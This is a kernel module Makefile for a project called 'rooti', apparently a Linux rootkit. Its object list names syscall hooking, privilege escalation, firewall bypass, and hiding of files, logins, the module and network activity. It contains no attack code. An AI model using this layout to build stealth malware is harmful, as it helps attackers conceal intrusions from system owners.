obj-m := rooti.o

# TODO: wildcard this
rooti-objs := main.o config.o utils.o
rooti-objs += hooking/utils.o hooking/syscall.o hooking/func.o
rooti-objs += capabilities/privilege.o capabilities/unloading.o  capabilities/fw_bypass.o
rooti-objs += capabilities/hiding/dentry.o capabilities/hiding/login.o capabilities/hiding/module.o capabilities/hiding/net.o
rooti-objs += capabilities/tracking/fd.o capabilities/tracking/process.o
rooti-objs += capabilities/asm/unloading.o